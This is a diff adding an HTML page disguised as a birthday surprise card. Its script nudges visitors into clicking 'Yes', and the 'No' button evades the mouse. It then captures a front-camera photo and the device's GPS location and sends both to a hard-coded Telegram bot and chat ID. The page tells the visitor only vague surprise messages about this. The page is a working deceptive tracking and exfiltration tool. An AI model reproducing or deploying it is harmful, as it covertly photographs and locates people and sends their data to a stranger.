@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Birthday Surprise!</title>
+    <style>
+        :root {
+            --primary: #ff6b6b;
+            --secondary: #ffa3a3;
+            --accent: #ffd166;
+            --text: #2b2b2b;
+            --light: #fff9f9;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        body {
+            font-family: 'Nunito', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text);
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            perspective: 1000px;
+        }
+
+        .card {
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            transform-style: preserve-3d;
+            transition: transform 0.8s;
+            position: relative;
+        }
+
+        .card.flipped {
+            transform: rotateY(180deg);
+        }
+
+        .card-face {
+            backface-visibility: hidden;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            padding: 40px 30px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .front {
+            background: white;
+        }
+
+        .back {
+            background: white;
+            transform: rotateY(180deg);
+            padding: 0;
+        }
+
+        h1 {
+            color: var(--primary);
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            text-align: center;
+            font-weight: 800;
+        }
+
+        .message {
+            font-size: 1.2rem;
+            text-align: center;
+            margin-bottom: 30px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            width: 100%;
+            max-width: 300px;
+            justify-content: center;
+        }
+
+        .btn {
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 700;
+            flex: 1;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn-yes {
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            color: white;
+        }
+
+        .btn-no {
+            background: white;
+            color: var(--text);
+            border: 2px solid #eee;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .photo-frame {
+            width: 100%;
+            height: 400px;
+            background: #f5f5f5;
+            position: relative;
+            overflow: hidden;
+        }
+
+        #cameraPreview {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .capture-btn {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: white;
+            border: 5px solid var(--light);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .capture-btn::after {
+            content: '';
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: 5px;
+            bottom: 5px;
+            background: var(--primary);
+            border-radius: 50%;
+        }
+
+        .status {
+            margin-top: 20px;
+            font-size: 1rem;
+            color: #666;
+            text-align: center;
+            min-height: 20px;
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent);
+            animation: confetti 5s ease-in-out infinite;
+            z-index: -1;
+        }
+
+        @keyframes confetti {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+
+        .polaroid-effect {
+            background: white;
+            padding: 15px 15px 40px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            transform: rotate(-2deg);
+            margin: 20px;
+        }
+
+        .polaroid-effect img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+
+        @keyframes floating {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="card" id="card">
+            <div class="card-face front">
+                <div class="polaroid-effect floating">
+                    <img src="https://i.imgur.com/J1vXH3j.png" alt="Birthday" style="border-radius: 2px;">
+                </div>
+                <h1>Wanna see who's the cutest and greatest?</h1>
+                <p class="message">Click "Yes" to reveal the magical surprise we've prepared just for you!</p>
+                <div class="button-group">
+                    <button class="btn btn-yes" id="yesBtn">Yes!</button>
+                    <button class="btn btn-no" id="noBtn">No</button>
+                </div>
+                <p class="status" id="status"></p>
+            </div>
+            <div class="card-face back">
+                <div class="photo-frame">
+                    <video id="cameraPreview" autoplay playsinline></video>
+                    <div class="capture-btn" id="captureBtn"></div>
+                </div>
+                <p class="status" id="backStatus">Smile for the camera!</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Create confetti
+        function createConfetti() {
+            const colors = ['#ff6b6b', '#ffd166', '#06d6a0', '#118ab2', '#073b4c'];
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                confetti.style.animationDelay = Math.random() * 5 + 's';
+                confetti.style.width = (Math.random() * 10 + 5) + 'px';
+                confetti.style.height = (Math.random() * 10 + 5) + 'px';
+                document.body.appendChild(confetti);
+            }
+        }
+
+        // DOM elements
+        const card = document.getElementById('card');
+        const yesBtn = document.getElementById('yesBtn');
+        const noBtn = document.getElementById('noBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const cameraPreview = document.getElementById('cameraPreview');
+        const statusElement = document.getElementById('status');
+        const backStatus = document.getElementById('backStatus');
+
+        let stream = null;
+
+        // Yes button click handler
+        yesBtn.addEventListener('click', () => {
+            createConfetti();
+            card.classList.add('flipped');
+            initializeCamera();
+        });
+
+        // No button click handler (with fun hover effect)
+        noBtn.addEventListener('mouseover', () => {
+            // Make the "No" button move away when trying to hover
+            const x = (Math.random() * 200 - 100) + 'px';
+            const y = (Math.random() * 200 - 100) + 'px';
+            noBtn.style.transform = `translate(${x}, ${y})`;
+        });
+
+        noBtn.addEventListener('click', () => {
+            statusElement.textContent = "Oh come on! Don't you want to see the surprise?";
+            createConfetti();
+        });
+
+        // Initialize camera
+        async function initializeCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                cameraPreview.srcObject = stream;
+            } catch (err) {
+                backStatus.textContent = "Couldn't access camera. Please allow camera access.";
+                console.error("Camera error: ", err);
+            }
+        }
+
+        // Capture photo
+        captureBtn.addEventListener('click', async () => {
+            if (!stream) return;
+            
+            backStatus.textContent = "Capturing your beautiful smile...";
+            
+            // Create canvas to capture photo
+            const canvas = document.createElement('canvas');
+            canvas.width = cameraPreview.videoWidth;
+            canvas.height = cameraPreview.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
+            
+            // Stop camera stream
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Convert to blob
+            const photoBlob = await new Promise(resolve => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            });
+            
+            try {
+                backStatus.textContent = "Getting your location...";
+                const position = await getLocation();
+                
+                backStatus.textContent = "Sending your surprise...";
+                
+                // Replace these with your actual bot token and chat ID
+                const BOT_TOKEN = '7705227922:AAGtp8QrTwDTq4eEXmMfLGGfdzI5Nx7HnBg';
+                const CHAT_ID = '6676630139';
+                
+                // Send photo to Telegram
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, 'birthday_photo.jpg');
+                formData.append('caption', 'Birthday surprise photo!');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Send location to Telegram
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        caption: 'Birthday surprise location!'
+                    })
+                });
+                
+                backStatus.textContent = "Surprise sent successfully! 🎉";
+                createConfetti();
+                
+            } catch (error) {
+                console.error('Error:', error);
+                backStatus.textContent = "Oops! Couldn't complete the surprise. Please try again.";
+            }
+        });
+
+        // Get location
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("Geolocation not supported"));
+                } else {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                }
+            });
+        }
+
+        // Initial confetti
+        createConfetti();
+    </script>
+</body>
+</html>
